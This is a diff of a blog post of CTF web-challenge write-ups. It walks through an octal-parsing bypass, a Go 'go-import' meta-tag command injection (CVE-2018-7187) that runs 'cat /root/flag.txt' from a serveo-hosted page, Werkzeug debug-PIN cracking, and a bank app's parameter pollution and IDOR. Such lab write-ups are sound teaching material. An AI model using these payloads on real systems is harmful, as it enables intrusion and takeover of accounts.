@@ -4,11 +4,12 @@ published: 2025-04-12
 description: "Aswan CTF Qualification 2025 Web Writeups"
 image: "https://miro.medium.com/v2/resize:fit:720/format:webp/1*aN690xr1i5WOS7hxhmGrMw.jpeg"
 tags: ["web", "CTF", "pentest","cybersecurity","writeup"]
-category: Writeups
+category: CTF
 lang: "en,ar"
 draft: false
 ---
 # ( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ )
+
 :::caution
  #FreePalastine
 :::
@@ -19,7 +20,6 @@ draft: false
 ممكن يكون في غلطات بسيطة في المصطلحات 
 ```
 
-
 [Shadoo's Blog](https://white-shadoo.github.io/)
 
 # L33t C0d3r
@@ -27,8 +27,8 @@ draft: false
 You can bypass the app.py check by using alternative number representations that equal 1337:
 
 - Using octal: `02471` (octal for 1337)
-    - In app.py: Python's `int("02471")` interprets this as decimal 2471
-    - In server.cpp: strtol("02471", nullptr, 0) interprets this as octal 2471 = decimal 1337
+  - In app.py: Python's `int("02471")` interprets this as decimal 2471
+  - In server.cpp: strtol("02471", nullptr, 0) interprets this as octal 2471 = decimal 1337
 
 ![image.png](./Aswan%20CTF%20Web%20Writeups/L33t%20C0d3r/image.png)
 
@@ -38,11 +38,11 @@ You can bypass the app.py check by using alternative number representations th
 
 # Gogeta
 
-in the DockerFile: `golang:1.9.4` 
+in the DockerFile: `golang:1.9.4`
 
 with a little search we can see that this version is very old and has a critical **CVE-2018-7187**
 
-here is a POC https://github.com/golang/go/issues/23867
+here is a POC <https://github.com/golang/go/issues/23867>
 
 add this to `/tmp/index.html`
 
@@ -50,7 +50,7 @@ add this to `/tmp/index.html`
 <meta name="go-import" content="60b5a867a1af82011f038b1fa6b2f2fb.serveo.net/tmp hg --config=hooks.pre-clone=cat${IFS}/root/flag.txt${IFS}$USER;echo${IFS}https://>/dev/null">
 ```
 
-just setup a local server using python in the root directory and use serveo to host it online 
+just setup a local server using python in the root directory and use serveo to host it online
 
 `python -m http.server 1337`
 
@@ -109,7 +109,7 @@ you will get the flag
 
 ![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%205.png)
 
-- after searching i got that exploit for generating the pin https://hacktricks.boitatech.com.br/pentesting/pentesting-web/werkzeug
+- after searching i got that exploit for generating the pin <https://hacktricks.boitatech.com.br/pentesting/pentesting-web/werkzeug>
 
 ```java
 import hashlib
@@ -223,8 +223,8 @@ print(rv)
 
 - after that it doesn’t work
 - so after more searching i reached that
-    - https://ctftime.org/writeup/17955
-    - https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/
+  - <https://ctftime.org/writeup/17955>
+  - <https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/>
 - now let’s try this exploit
 
 ```java
@@ -312,17 +312,21 @@ if __name__ == '__main__':
 ![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%2010.png)
 
 ---
+
 # Yaoguai Bank
 
 ### Step 1: Register an Account
+
 - Visit register.html
 - Create an account with any email/password
 
 ### Step 2: Exploit Parameter Pollution to Gain Premium Status
+
 - Log in to your new account
 - Navigate to Transfer page (/front/transfer.html)
 
 Create a transfer with:
+
 - Create a second account and use its account number
 - Amount: Any small amount like 10
 - Reference Number: whatever&amount=20000000
@@ -337,10 +341,10 @@ Flask's `request.args.get('amount')` takes the first occurrence (20000000), givi
 The `checkPremium()` function automatically promotes you to premium
 ![image.png](./Aswan%20CTF%20Web%20Writeups/Yaoguai%20Bank/image.png)
 
-
 ### Step 3: Exploit the IDOR Vulnerability
 
 Looking at the code in `[UsersRepository.php]`, we can see the problematic function:
+
 ```php
 <?php
 public static function EnsureEditUserAuthority($id,$OwnerId){
@@ -355,6 +359,7 @@ public static function EnsureEditUserAuthority($id,$OwnerId){
 
 Despite its name suggesting it's checking authorization, this function actually changes ownership in the database.
 In `[UserController.php]`, there are two contrasting implementations:
+
 ```php
 <?php
 // For changing passwords - HAS ownership verification
@@ -388,6 +393,7 @@ The `editSubUser` function has no verification that you own the user you're tryi
 
 How the Attack Works
 When we make our request in the console(you can use burp):
+
 ```javascript
 fetch('../api/EditSubUser.php', {
   method: 'POST',
@@ -398,34 +404,42 @@ fetch('../api/EditSubUser.php', {
   })
 })
 ```
+
 This triggers a chain of calls:
 
 - `EditSubUser.php` receives our request
 - Calls `UserController->editSubUser()` with our data  
 - No ownership verification happens  
 - Calls `UsersService->editSubUser(9050, "test", YOUR_ID)`  
-- Calls `UsersRepository::EnsureEditUserAuthority(9050, YOUR_ID) ` 
+- Calls `UsersRepository::EnsureEditUserAuthority(9050, YOUR_ID)`
 - The SQL that executes is:
+
 ```sql
 UPDATE users SET OwnerId = YOUR_ID WHERE UserId = 9050
 ```
+
 This changes the database record in the users table from:
+
 ```
 UserId: 9050, OwnerId: 1
 ```
+
 To:
+
 ```
 UserId: 9050, OwnerId: YOUR_ID
 ```
+
 Now account `500` (with ID `9050`) belongs to you as its `owner`, making you able to access it directly after changing its password.
 ![image.png](./Aswan%20CTF%20Web%20Writeups/Yaoguai%20Bank/image%201.png)
 
-
 ### Step 4: Access the Sub-User to Get the Flag
+
 - From your profile page, you can now see account 500 as your sub-user
 - Change its password using the "Change Password" button
 - Log out and log in as account 500 using its email and your new password
 - The flag appears as the name due to the condition in `SubUser.php`:
+
 ```php
 <?php
 if($this->getAccountNumber()<10000000){
@@ -438,7 +452,6 @@ Once account 500 was under our ownership, refreshed the profile page to view our
 Change the password of that `Admin@yao.com`  and login
 
 ![image.png](./Aswan%20CTF%20Web%20Writeups/Yaoguai%20Bank/image%202.png)
-
 
 `YAO{b4nk_h3ck3d_cuz_greed}`
 
